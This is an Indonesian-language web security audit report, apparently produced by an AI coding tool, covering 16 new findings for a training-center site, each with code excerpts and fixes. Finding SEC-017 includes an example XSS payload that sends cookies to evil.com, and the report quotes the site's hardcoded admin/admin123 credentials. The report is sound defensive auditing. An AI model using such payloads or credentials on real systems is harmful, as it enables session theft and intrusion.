# LAPORAN AUDIT KEAMANAN V2 — TEMUAN TAMBAHAN
## SEAL Training Center Website

| Detail | Keterangan |
|--------|------------|
| **Tanggal Audit** | 23 Juni 2026 |
| **Jenis** | Audit Lanjutan (Deep Scan) |
| **Scope** | Temuan baru di luar 13 temuan pada laporan V1 |
| **Auditor** | Claude Code (Automated Security Audit) |

---

## Daftar Isi

1. [Status 13 Temuan Sebelumnya](#1-status-13-temuan-sebelumnya)
2. [Temuan Baru — Kritis (P0)](#2-temuan-baru--kritis-p0)
3. [Temuan Baru — Tinggi (P1)](#3-temuan-baru--tinggi-p1)
4. [Temuan Baru — Sedang (P2)](#4-temuan-baru--sedang-p2)
5. [Temuan Baru — Rendah (P3)](#5-temuan-baru--rendah-p3)
6. [Checklist Perbaikan Gabungan](#6-checklist-perbaikan-gabungan)
7. [Panduan Hardening Production](#7-panduan-hardening-production)

---

## 1. Status 13 Temuan Sebelumnya

> **Catatan:** Berdasarkan scan kode terkini (23 Juni 2026), **semua 13 temuan dari laporan V1 masih ada** dan belum diperbaiki di codebase. Pastikan perbaikan sudah di-commit dan di-push sebelum deploy.

| ID | Temuan | Status |
|----|--------|--------|
| SEC-001 | Kredensial hardcoded `admin/admin123` | Masih ada di `admin.tsx:880` |
| SEC-002 | Autentikasi client-side (sessionStorage) | Masih ada di `admin.tsx:882` |
| SEC-003 | API tanpa autentikasi | Masih ada di `admin.tsx:911, 1011` |
| SEC-004 | Tidak ada CSRF protection | Belum diimplementasi |
| SEC-005 | XSS via certificate data di HTML template | Masih ada di `admin.tsx:59, 342-376` |
| SEC-006 | URL API hardcoded localhost | Masih ada di `index.tsx:970, 1503` |
| SEC-007 | Tidak ada security headers | Masih ada di `start.ts` |
| SEC-008 | File upload tanpa validasi memadai | Masih ada di `admin.tsx:978-991` |
| SEC-009 | Tidak ada rate limiting | Belum diimplementasi |
| SEC-010 | Input validation tidak memadai | Masih ada di `index.tsx:1490-1509` |
| SEC-011 | Informasi internal ter-ekspos | Masih ada |
| SEC-012 | CDN tanpa SRI | Masih ada di `admin.tsx:454, 468, 487-490` |
| SEC-013 | Error logging di production | Masih ada |

---

## 2. Temuan Baru — Kritis (P0)

### SEC-014: Kredensial Admin Ditampilkan di Halaman Login (Information Disclosure)

| Detail | Keterangan |
|--------|------------|
| **Severity** | KRITIS |
| **File** | `src/routes/admin.tsx` baris 1108 |
| **OWASP** | A07:2021 - Identification and Authentication Failures |

**Deskripsi:**

Halaman login secara eksplisit menampilkan username dan password admin kepada semua pengunjung sebagai "Tip":

```tsx
// src/routes/admin.tsx:1108
<p className="text-[10px] text-midgray leading-relaxed uppercase tracking-wider font-semibold">
  Tip: {t("Gunakan username", "Use username")} 
  <span className="text-charcoal font-black">admin</span> & password 
  <span className="text-charcoal font-black">admin123</span>
</p>
```

**Dampak:**
- Kredensial admin terlihat jelas di halaman login tanpa perlu melihat source code
- Siapapun yang mengakses `/admin` langsung tahu username dan password
- Membuat semua proteksi login menjadi tidak berguna

**Solusi:**
1. Hapus seluruh elemen "Tip" yang menampilkan kredensial
2. Jangan pernah menampilkan credential hint di UI production

---

### SEC-015: Third-Party API Dependency untuk QR Code — Data Leakage

| Detail | Keterangan |
|--------|------------|
| **Severity** | KRITIS |
| **File** | `src/routes/admin.tsx` baris 54, 683 |
| **OWASP** | A08:2021 - Software and Data Integrity Failures |

**Deskripsi:**

Aplikasi menggunakan API pihak ketiga (`api.qrserver.com`) untuk generate QR code, dan mengirimkan URL verifikasi sertifikat beserta nomor sertifikat ke server eksternal:

```typescript
// src/routes/admin.tsx:54 (HTML template)
const qrUrl = `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(verificationUrl)}`;

// src/routes/admin.tsx:683 (PDF generation)
const qrUrl = `https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=${encodeURIComponent(verificationUrl)}&format=png`;
```

Di mana `verificationUrl` berisi:
```typescript
const verificationUrl = `${window.location.origin}/?nomor=${encodeURIComponent(cert.nomor_sertifikat)}`;
```

**Dampak:**
- Setiap nomor sertifikat dikirim ke server pihak ketiga (api.qrserver.com)
- Server pihak ketiga bisa log semua nomor sertifikat yang di-generate
- Jika api.qrserver.com down, sertifikat tidak bisa dicetak
- Data sertifikat (yang bersifat sensitif/legal) bocor ke pihak ketiga
- Melanggar prinsip data minimization

**Solusi:**
1. Gunakan library QR code lokal (generate di browser):
   ```bash
   npm install qrcode
   ```
   ```typescript
   import QRCode from 'qrcode';
   const qrDataUrl = await QRCode.toDataURL(verificationUrl);
   ```
2. Atau gunakan library `qrcode` yang sudah ada untuk Node.js/browser
3. Tidak ada data yang perlu dikirim ke server eksternal

---

### SEC-016: Halaman Admin Accessible Tanpa Route Protection

| Detail | Keterangan |
|--------|------------|
| **Severity** | KRITIS |
| **File** | `src/routes/admin.tsx` baris 1037-1038 |
| **OWASP** | A01:2021 - Broken Access Control |

**Deskripsi:**

Route `/admin` tidak memiliki route-level protection. Halaman admin di-render sepenuhnya di browser, dan proteksi login hanya berupa conditional rendering di dalam component:

```typescript
// src/routes/admin.tsx:1037-1038
if (!isLoggedIn) {
  return ( <LoginForm /> );
}
// ... else render full admin dashboard
```

**Masalah keamanan:**
- Seluruh kode admin (termasuk fungsi CRUD, upload, print) tetap ter-bundle dan terkirim ke browser semua pengunjung
- Attacker bisa mempelajari struktur API, endpoint, dan logika bisnis dari source code yang terkirim
- Tidak ada server-side route guard — client menerima semua kode admin

**Solusi:**
1. Implementasi route guard di server (TanStack Start `beforeLoad`):
   ```typescript
   export const Route = createFileRoute("/admin")({
     beforeLoad: async ({ context }) => {
       const session = await validateSession(context);
       if (!session) throw redirect({ to: '/login' });
     },
     component: AdminPage,
   });
   ```
2. Idealnya, pisahkan admin sebagai lazy-loaded route yang hanya dimuat setelah autentikasi server-side berhasil
3. Gunakan code splitting agar kode admin tidak terkirim ke user yang tidak login

---

## 3. Temuan Baru — Tinggi (P1)

### SEC-017: Stored XSS via Certificate HTML Template — Multiple Injection Points

| Detail | Keterangan |
|--------|------------|
| **Severity** | TINGGI |
| **File** | `src/routes/admin.tsx` baris 342-376 |
| **OWASP** | A03:2021 - Injection |

**Deskripsi:**

Fungsi `getCertificateHtml()` menyisipkan banyak data dinamis langsung ke dalam HTML template tanpa sanitization apapun. Ini lebih luas dari temuan SEC-005 sebelumnya:

```typescript
// Semua field ini langsung dimasukkan ke HTML tanpa escape:
<div class="participant-name">${data.nama_peserta}</div>           // baris 342
<div class="nik-line">NIK : ${data.nik || '-'}</div>              // baris 343
<div class="program-name">${data.nama_program}</div>               // baris 347
<span class="date-val">${formatDate(data.tanggal_terbit)}</span>   // baris 350
<div class="sig-underline">${data.nama_trainer || 'INSTRUCTOR'}</div> // baris 359
<div class="cert-num-tag">Certificate Number : ${data.nomor_sertifikat}</div> // baris 376
```

**Total 6+ injection points** di satu template.

**Dampak:**
- Jika database terkompromi (melalui SEC-003), attacker bisa menyimpan payload XSS di field manapun
- Ketika admin membuka/print sertifikat, XSS tereksekusi
- Bisa mencuri session, redirect ke phishing site, atau menjalankan kode arbitrary
- Serangan bisa menyebar ke setiap admin yang mencetak sertifikat tersebut

**Contoh Serangan:**
```
nama_peserta: <img src=x onerror="fetch('https://evil.com/steal?cookie='+document.cookie)">
```

**Solusi:**
1. Buat fungsi escape HTML:
   ```typescript
   const escapeHtml = (str: string): string => {
     const map: Record<string, string> = {
       '&': '&amp;', '<': '&lt;', '>': '&gt;',
       '"': '&quot;', "'": '&#039;'
     };
     return str.replace(/[&<>"']/g, (c) => map[c]);
   };
   ```
2. Terapkan di setiap field yang disisipkan ke HTML:
   ```typescript
   <div class="participant-name">${escapeHtml(data.nama_peserta)}</div>
   ```

---

### SEC-018: PDF Content Stream Manipulation — Server-Side Template Injection Risk

| Detail | Keterangan |
|--------|------------|
| **Severity** | TINGGI |
| **File** | `src/routes/admin.tsx` baris 588-635 |
| **OWASP** | A03:2021 - Injection |

**Deskripsi:**

Fungsi `generateCertificatePDF()` melakukan manipulasi langsung pada PDF content streams, termasuk regex replacement pada binary content:

```typescript
// src/routes/admin.tsx:620-626
contentStr = contentStr.replace(/nama_peserta/g, "            ");
contentStr = contentStr.replace(/nik_peserta/g, "           ");
contentStr = contentStr.replace(/nama_pelatihan/g, "              ");
contentStr = contentStr.replace(/tanggal_pelatihan/g, "                 ");
contentStr = contentStr.replace(/nomor_sertifikat/g, "                ");
contentStr = contentStr.replace(/nama_trainer/g, "            ");
```

**Risiko:**
- Regex replacement pada binary PDF stream bisa menyebabkan PDF corruption
- Jika data sertifikat mengandung string yang mirip dengan placeholder (misalnya nama peserta berisi "nama_peserta"), stream akan rusak
- PDF content stream yang dimanipulasi secara manual bisa menjadi vektor untuk PDF injection attacks

**Solusi:**
1. Gunakan placeholder yang unik dan tidak mungkin muncul di data normal (misalnya `{{__NAMA_PESERTA__}}`)
2. Atau lebih baik: jangan manipulasi content stream sama sekali — gambar overlay di atas template menggunakan pdf-lib API yang sudah tersedia (yang sebetulnya sudah dilakukan di baris 640-677)
3. Hapus blok regex replacement (baris 620-626) jika overlay sudah cukup menutupi placeholder

---

### SEC-019: Signature Image Fetch Tanpa Validasi Origin (SSRF Risk)

| Detail | Keterangan |
|--------|------------|
| **Severity** | TINGGI |
| **File** | `src/routes/admin.tsx` baris 713-714 |
| **OWASP** | A10:2021 - Server-Side Request Forgery |

**Deskripsi:**

```typescript
// src/routes/admin.tsx:712-714
const safeCertNumber = cert.nomor_sertifikat.replace(/[^A-Za-z0-9_\-]/g, '_');
const sigUrl = `${API_BASE_URL}/signatures/${safeCertNumber}.png`;
const sigResponse = await fetch(sigUrl);
```

Meskipun `safeCertNumber` di-sanitize, `API_BASE_URL` sendiri bisa dimanipulasi melalui environment variable `VITE_API_URL`. Jika attacker berhasil mengubah env variable (misalnya melalui supply-chain attack pada build tool), semua fetch request bisa diarahkan ke server berbahaya.

**Dampak:**
- Jika `VITE_API_URL` diubah, seluruh data sertifikat dikirim ke server attacker
- Response dari server attacker (signature image) bisa berisi exploit

**Solusi:**
1. Hardcode domain whitelist untuk API URL validation:
   ```typescript
   const ALLOWED_API_ORIGINS = ['https://api.seal-center.co.id', 'https://seal-center.co.id'];
   const apiUrl = new URL(API_BASE_URL);
   if (!ALLOWED_API_ORIGINS.includes(apiUrl.origin)) {
     throw new Error('Unauthorized API origin');
   }
   ```
2. Validasi response content-type sebelum memproses:
   ```typescript
   if (!sigResponse.headers.get('content-type')?.startsWith('image/')) {
     throw new Error('Invalid signature response');
   }
   ```

---

### SEC-020: `innerHTML` via iframe — DOM-based XSS

| Detail | Keterangan |
|--------|------------|
| **Severity** | TINGGI |
| **File** | `src/routes/admin.tsx` baris 391-425 |
| **OWASP** | A03:2021 - Injection |

**Deskripsi:**

Fungsi `printCertificate()` membuat iframe dan memuat PDF blob ke dalamnya. Sebelumnya (dalam versi lama kode), HTML ditulis langsung ke iframe melalui `doc.write()`. Meskipun sekarang sudah menggunakan PDF blob, fungsi `getCertificateHtml()` masih ada dan bisa dipanggil, yang menulis HTML mentah dari data user:

```typescript
// getCertificateHtml() return value berisi data user tanpa sanitization
// yang bisa di-render di iframe
```

**Dampak:**
- Jika ada code path yang memanggil `getCertificateHtml()` dan merender hasilnya di DOM, XSS terjadi
- Template HTML masih tersedia sebagai fungsi yang bisa dipanggil

**Solusi:**
1. Jika `getCertificateHtml()` tidak digunakan lagi (diganti PDF), hapus fungsi tersebut
2. Jika masih digunakan, escape semua data sebelum insert ke HTML (lihat SEC-017)

---

### SEC-021: Open Redirect via Query Parameter

| Detail | Keterangan |
|--------|------------|
| **Severity** | TINGGI |
| **File** | `src/routes/index.tsx` |
| **OWASP** | A01:2021 - Broken Access Control |

**Deskripsi:**

Halaman landing menerima parameter `?nomor=` dari URL untuk auto-fill form verifikasi sertifikat:

```typescript
// Verification URL format (generated in admin.tsx:53):
const verificationUrl = `${window.location.origin}/?nomor=${encodeURIComponent(data.nomor_sertifikat)}`;
```

Meskipun bukan open redirect klasik, parameter ini bisa disalahgunakan:
- URL dengan parameter `?nomor=<script>...</script>` bisa dikirim via phishing email
- Jika value dari query parameter di-render tanpa escape, bisa terjadi Reflected XSS

**Solusi:**
1. Validasi format parameter `nomor` — hanya izinkan karakter alfanumerik dan tanda baca sertifikat
2. Jangan render query parameter langsung ke DOM tanpa sanitization

---

## 4. Temuan Baru — Sedang (P2)

### SEC-022: Tidak Ada Session Timeout / Auto-Logout

| Detail | Keterangan |
|--------|------------|
| **Severity** | SEDANG |
| **File** | `src/routes/admin.tsx` baris 752-757 |
| **OWASP** | A07:2021 - Identification and Authentication Failures |

**Deskripsi:**

```typescript
const [isLoggedIn, setIsLoggedIn] = useState(() => {
  if (typeof window !== "undefined") {
    return sessionStorage.getItem("seal_admin_auth") === "true";
  }
  return false;
});
```

Session admin tidak memiliki waktu kadaluarsa (timeout). Selama tab browser tidak ditutup, admin tetap login selamanya.

**Risiko:**
- Jika admin meninggalkan komputer tanpa logout, siapapun bisa mengakses dashboard
- Di komputer bersama (warnet, lab, kantor), session bisa digunakan orang lain
- Tidak ada idle timeout

**Solusi:**
1. Implementasi session timeout (misalnya 30 menit idle):
   ```typescript
   const SESSION_TIMEOUT = 30 * 60 * 1000; // 30 menit
   useEffect(() => {
     const timer = setInterval(() => {
       const lastActivity = sessionStorage.getItem("seal_last_activity");
       if (lastActivity && Date.now() - parseInt(lastActivity) > SESSION_TIMEOUT) {
         handleLogout();
       }
     }, 60000);
     return () => clearInterval(timer);
   }, []);
   ```
2. Tambahkan event listener untuk mendeteksi aktivitas user dan reset timer

---

### SEC-023: Unvalidated External Resource Loading (Google Maps iframe)

| Detail | Keterangan |
|--------|------------|
| **Severity** | SEDANG |
| **File** | `src/routes/index.tsx` baris 1555-1560 |
| **OWASP** | A05:2021 - Security Misconfiguration |

**Deskripsi:**

```tsx
<iframe
  title="Lokasi SEAL Training Center"
  src="https://www.google.com/maps/embed?pb=!1m18!..."
  className="h-full w-full"
  loading="lazy"
/>
```

Iframe Google Maps dimuat tanpa atribut `sandbox` atau `referrerpolicy`.

**Risiko:**
- Iframe tanpa sandbox bisa mengakses top-level navigation
- Referrer header mengirim URL halaman ke Google
- Meskipun Google Maps relatif aman, ini melanggar prinsip defense-in-depth

**Solusi:**
```tsx
<iframe
  title="Lokasi SEAL Training Center"
  src="https://www.google.com/maps/embed?pb=!1m18!..."
  className="h-full w-full"
  loading="lazy"
  sandbox="allow-scripts allow-same-origin"
  referrerPolicy="no-referrer"
/>
```

---

### SEC-024: Duplicate Meta Tags — SEO Poisoning Risk

| Detail | Keterangan |
|--------|------------|
| **Severity** | SEDANG |
| **File** | `src/routes/__root.tsx` baris 86-102 |

**Deskripsi:**

Root layout memiliki duplicate meta tags:

```typescript
// Baris 86-87: description dalam Bahasa Indonesia
{ name: "description", content: "SEAL Training Center menyediakan pelatihan HSE..." },

// Baris 98: description dalam Bahasa Inggris (DUPLIKAT)
{ name: "description", content: "SEAL Safety Hub provides premium HSE..." },

// og:description juga duplikat (baris 92 dan 99)
// twitter:description tidak ada padanan Bahasa Indonesia
```

**Risiko:**
- Search engine mungkin menggunakan description yang salah
- Inkonsistensi antara "SEAL Training Center" dan "SEAL Safety Hub" — bisa dimanfaatkan untuk phishing/impersonation
- Brand confusion untuk SEO

**Solusi:**
1. Hapus duplicate meta tags
2. Konsistenkan nama brand ("SEAL Training Center" atau "SEAL Safety Hub")
3. Gunakan i18n system yang sudah ada untuk meta tags berdasarkan bahasa

---

### SEC-025: CDN Scripts Loaded Tanpa Version Pinning yang Aman

| Detail | Keterangan |
|--------|------------|
| **Severity** | SEDANG |
| **File** | `src/routes/admin.tsx` baris 446-533 |
| **OWASP** | A08:2021 - Software and Data Integrity Failures |

**Deskripsi:**

Tiga library dimuat dari CDN secara runtime:

```typescript
// pdf-lib dari unpkg (baris 454)
script.src = "https://unpkg.com/pdf-lib@1.17.1/dist/pdf-lib.min.js";

// JSZip dari cdnjs (baris 468, 488)
script.src = "https://cdnjs.cloudflare.com/ajax/libs/jszip/3.10.1/jszip.min.js";

// html2canvas dari cdnjs (baris 489)
script.src = "https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js";

// jsPDF dari cdnjs (baris 490)
script.src = "https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js";
```

**Risiko Multi-layer:**
1. **Availability:** Jika CDN down, sertifikat tidak bisa dicetak/download
2. **Integrity:** Tanpa SRI hash, CDN yang terkompromi bisa menyajikan kode berbahaya
3. **Privacy:** CDN bisa tracking penggunaan (IP address, referrer)
4. **Mixed Content:** Jika site di HTTPS tapi CDN response diintercept (MitM), kode berbahaya bisa diinjeksi
5. **Supply Chain Attack:** unpkg menyajikan package npm langsung — jika npm package terkompromi, CDN juga ikut

**Solusi:**
1. Install semua library via npm dan bundle bersama aplikasi:
   ```bash
   npm install pdf-lib jszip jspdf html2canvas
   ```
2. Import sebagai module:
   ```typescript
   import { PDFDocument, rgb, StandardFonts } from 'pdf-lib';
   import JSZip from 'jszip';
   ```
3. Jika harus tetap CDN, tambahkan integrity hash:
   ```typescript
   script.integrity = "sha384-<hash>";
   script.crossOrigin = "anonymous";
   ```

---

### SEC-026: Signature Image Tidak Divalidasi (Unrestricted File Type)

| Detail | Keterangan |
|--------|------------|
| **Severity** | SEDANG |
| **File** | `src/routes/admin.tsx` baris 777-787, 1305-1309 |
| **OWASP** | A04:2021 - Insecure Design |

**Deskripsi:**

Upload tanda tangan trainer hanya menggunakan `accept="image/*"` tanpa validasi tambahan:

```tsx
// File input (baris 1306-1307)
<input type="file" accept="image/*" onChange={handleSignatureFileChange} />

// Handler (baris 777-787)
const handleSignatureFileChange = (e: React.ChangeEvent<HTMLInputElement>) => {
  if (e.target.files && e.target.files[0]) {
    const file = e.target.files[0];
    const reader = new FileReader();
    reader.onload = (event) => {
      if (event.target?.result) {
        setTrainerSigBase64(event.target.result as string);
      }
    };
    reader.readAsDataURL(file);
  }
};
```

**Risiko:**
- `accept="image/*"` hanya hint untuk file picker, bukan validasi — user bisa upload file apapun
- File dibaca sebagai base64 dan dikirim ke API tanpa validasi ukuran
- Image besar bisa menyebabkan memory issue di browser (DoS)
- Base64 encoding meningkatkan ukuran ~33% — image 10MB menjadi ~13MB di memory
- Tidak ada validasi dimensi gambar

**Solusi:**
```typescript
const handleSignatureFileChange = (e: React.ChangeEvent<HTMLInputElement>) => {
  const file = e.target.files?.[0];
  if (!file) return;

  // Validasi MIME type
  if (!['image/png', 'image/jpeg', 'image/webp'].includes(file.type)) {
    alert('Format file harus PNG, JPG, atau WebP');
    return;
  }

  // Validasi ukuran (max 2MB)
  if (file.size > 2 * 1024 * 1024) {
    alert('Ukuran file maksimal 2MB');
    return;
  }

  // Validasi bahwa file benar-benar image
  const img = new Image();
  img.onload = () => {
    if (img.width > 2000 || img.height > 2000) {
      alert('Dimensi gambar maksimal 2000x2000 pixel');
      return;
    }
    // Proceed with FileReader
    const reader = new FileReader();
    reader.onload = (event) => {
      setTrainerSigBase64(event.target?.result as string);
    };
    reader.readAsDataURL(file);
  };
  img.onerror = () => alert('File bukan gambar yang valid');
  img.src = URL.createObjectURL(file);
};
```

---

## 5. Temuan Baru — Rendah (P3)

### SEC-027: Memory Leak pada Object URL dan iframe

| Detail | Keterangan |
|--------|------------|
| **Severity** | RENDAH |
| **File** | `src/routes/admin.tsx` baris 391-425 |

**Deskripsi:**

`printCertificate()` membuat Object URL dari blob PDF tapi tidak pernah memanggil `URL.revokeObjectURL()`:

```typescript
// src/routes/admin.tsx:400
const pdfBlob = await generateCertificatePDF(data);
const url = window.URL.createObjectURL(pdfBlob);

// iframe dibuat dan src di-set, tapi URL tidak pernah di-revoke
iframe.src = url;
// Missing: window.URL.revokeObjectURL(url) setelah print
```

Bandingkan dengan `handleDownloadPdf()` (baris 436-438) yang sudah benar:
```typescript
window.URL.revokeObjectURL(url); // ✅ Sudah benar
```

**Dampak:**
- Setiap kali admin mencetak sertifikat, memory bocor (PDF blob tetap di memory)
- Jika admin mencetak banyak sertifikat, browser bisa menjadi lambat

**Solusi:**
```typescript
iframe.onload = () => {
  setTimeout(() => {
    iframe.contentWindow?.focus();
    iframe.contentWindow?.print();
    // Revoke setelah print selesai
    setTimeout(() => window.URL.revokeObjectURL(url), 5000);
  }, 500);
};
```

---

### SEC-028: `console.error` dan `console.log` di Production Code

| Detail | Keterangan |
|--------|------------|
| **Severity** | RENDAH |
| **File** | Multiple locations |

**Deskripsi:**

Banyak `console.error` dan `console.log` tersebar di kode production:

| Lokasi | Statement |
|--------|-----------|
| `admin.tsx:423` | `console.error("Gagal mencetak PDF:", err)` |
| `admin.tsx:440` | `console.error("Gagal mendownload PDF:", err)` |
| `admin.tsx:610` | `console.log("Ditemukan image di PDF template:", ...)` |
| `admin.tsx:615` | `console.log("QR Code disesuaikan dengan template:", ...)` |
| `admin.tsx:634` | `console.error("Gagal mendeteksi QR code...", err)` |
| `admin.tsx:707` | `console.error("Gagal menggambar QR code:", err)` |
| `admin.tsx:1031` | `console.error(err)` |
| `__root.tsx:40` | `console.error(error)` |
| `start.ts:12` | `console.error(error)` |
| `server.ts:33,47` | `console.error(...)` |

**Dampak:**
- `console.log` di baris 610, 615 mengekspos detail internal PDF template parsing
- Error messages dalam Bahasa Indonesia bisa membantu attacker memahami stack
- Stack traces bisa mengekspos file paths dan struktur internal

**Solusi:**
1. Hapus semua `console.log` debug statements
2. Ganti `console.error` dengan error reporting service (Sentry)
3. Atau wrap dalam environment check:
   ```typescript
   const logError = (msg: string, err: unknown) => {
     if (import.meta.env.DEV) console.error(msg, err);
     // In production, send to error reporting service
   };
   ```

---

### SEC-029: Error Component Mengekspos Error Object

| Detail | Keterangan |
|--------|------------|
| **Severity** | RENDAH |
| **File** | `src/routes/__root.tsx` baris 39-44 |

**Deskripsi:**

```typescript
function ErrorComponent({ error, reset }: { error: Error; reset: () => void }) {
  console.error(error); // Error terekspos di console
  useEffect(() => {
    reportLovableError(error, { boundary: "tanstack_root_error_component" });
  }, [error]);
  // ...
}
```

Error object dikirim ke `reportLovableError()` yang meneruskannya ke `window.__lovableEvents?.captureException()` — sebuah global function yang bisa diakses dan dimanipulasi oleh code injection:

```typescript
// src/lib/lovable-error-reporting.ts:23
window.__lovableEvents?.captureException?.(error, { ... });
```

**Risiko:**
- Attacker bisa override `window.__lovableEvents.captureException` untuk mencuri error details
- Error object bisa berisi informasi sensitif (stack trace, API URLs, data user)

**Solusi:**
1. Jangan kirim full error object ke global function di production
2. Sanitize error sebelum reporting:
   ```typescript
   const sanitizedError = { message: error.message, name: error.name };
   ```

---

## 6. Checklist Perbaikan Gabungan

### P0 — Kritis (Harus diperbaiki sebelum deploy)

- [ ] **SEC-001** — Hapus kredensial hardcoded `admin/admin123`
- [ ] **SEC-002** — Ganti sessionStorage dengan server-side session
- [ ] **SEC-003** — Tambahkan auth token di setiap API request
- [ ] **SEC-014** — Hapus "Tip" kredensial dari halaman login UI
- [ ] **SEC-015** — Ganti QR code API pihak ketiga dengan library lokal
- [ ] **SEC-016** — Implementasi server-side route guard untuk `/admin`

### P1 — Tinggi (Sprint berikutnya)

- [ ] **SEC-004** — Implementasi CSRF protection
- [ ] **SEC-005** — Sanitize HTML output di template sertifikat
- [ ] **SEC-006** — Ganti URL hardcoded localhost dengan environment variable
- [ ] **SEC-007** — Tambahkan security headers (CSP, HSTS, X-Frame-Options)
- [ ] **SEC-017** — Escape semua 6+ injection points di `getCertificateHtml()`
- [ ] **SEC-018** — Perbaiki/hapus PDF content stream regex manipulation
- [ ] **SEC-019** — Validasi origin API URL dan response content-type
- [ ] **SEC-020** — Hapus `getCertificateHtml()` jika sudah tidak digunakan
- [ ] **SEC-021** — Validasi query parameter `?nomor=` di landing page

### P2 — Sedang (Dijadwalkan)

- [ ] **SEC-008** — Validasi MIME type + size limit pada file upload
- [ ] **SEC-009** — Implementasi rate limiting + CAPTCHA
- [ ] **SEC-010** — Implementasi Zod validation pada form
- [ ] **SEC-011** — Ubah path API dari `/Project-seal-ssh/` ke path generik
- [ ] **SEC-022** — Tambahkan session timeout (30 menit idle)
- [ ] **SEC-023** — Tambahkan sandbox + referrerPolicy pada iframe Google Maps
- [ ] **SEC-024** — Hapus duplicate meta tags, konsistenkan brand name
- [ ] **SEC-025** — Ganti CDN scripts dengan npm packages (bundle lokal)
- [ ] **SEC-026** — Validasi MIME, ukuran, dan dimensi signature image

### P3 — Rendah (Opsional tapi direkomendasikan)

- [ ] **SEC-012** — Tambahkan SRI hash jika tetap pakai CDN
- [ ] **SEC-013** — Kondisikan console.error untuk dev only
- [ ] **SEC-027** — Fix memory leak Object URL di `printCertificate()`
- [ ] **SEC-028** — Hapus semua console.log/error debug statements
- [ ] **SEC-029** — Sanitize error object sebelum reporting

---

## 7. Panduan Hardening Production

### Checklist Sebelum Deploy

```
INFRASTRUKTUR
├── [ ] HTTPS aktif dengan sertifikat SSL valid (Let's Encrypt)
├── [ ] HTTP redirect ke HTTPS
├── [ ] Domain production sudah dikonfigurasi
├── [ ] VITE_API_URL sudah di-set ke HTTPS production URL
├── [ ] DNS CAA record untuk membatasi certificate authority
└── [ ] Reverse proxy (Nginx/Cloudflare) dengan rate limiting

BACKEND PHP
├── [ ] Semua endpoint memvalidasi auth token
├── [ ] Password disimpan dengan bcrypt/Argon2
├── [ ] SQL queries menggunakan prepared statements
├── [ ] File upload divalidasi (MIME, size, magic bytes)
├── [ ] CORS dikonfigurasi dengan whitelist origin
├── [ ] Error messages tidak mengekspos detail internal
├── [ ] Logging aktif untuk audit trail
└── [ ] PHP error_reporting off di production

FRONTEND
├── [ ] Tidak ada kredensial di source code
├── [ ] Semua API calls menggunakan environment variable
├── [ ] HTML output di-sanitize (DOMPurify/escape)
├── [ ] Console.log/error dihapus atau dikondisikan
├── [ ] CDN libraries diganti npm packages
├── [ ] QR code di-generate lokal (tanpa API pihak ketiga)
├── [ ] Source maps disabled di production build
└── [ ] Meta tags konsisten dan tidak duplikat

MONITORING
├── [ ] Error reporting service aktif (Sentry)
├── [ ] Uptime monitoring aktif
├── [ ] Dependency vulnerability scanning (npm audit)
├── [ ] Regular security audit terjadwal
└── [ ] Incident response plan tersedia
```

### Perintah Audit Dependencies

Jalankan secara berkala untuk memeriksa vulnerability di dependencies:

```bash
# Cek vulnerability di npm packages
npm audit

# Cek dan auto-fix jika memungkinkan
npm audit fix

# Update dependencies ke versi aman
npm update
```

---

## Ringkasan

| Kategori | V1 | V2 (Baru) | Total |
|----------|----|-----------|----- |
| Kritis (P0) | 3 | 3 | **6** |
| Tinggi (P1) | 4 | 5 | **9** |
| Sedang (P2) | 4 | 5 | **9** |
| Rendah (P3) | 2 | 3 | **5** |
| **TOTAL** | **13** | **16** | **29** |

**Skor Keamanan Terkini: 3/10 (KRITIS)**

Skor tidak berubah karena 13 temuan V1 belum diperbaiki. Setelah semua P0 dan P1 diperbaiki, skor diperkirakan naik menjadi **7-8/10**. Setelah semua temuan diperbaiki: **9/10**.

---

*Laporan Audit V2 — Generated by Claude Code Security Audit*
*Untuk pertanyaan teknis, hubungi tim development*
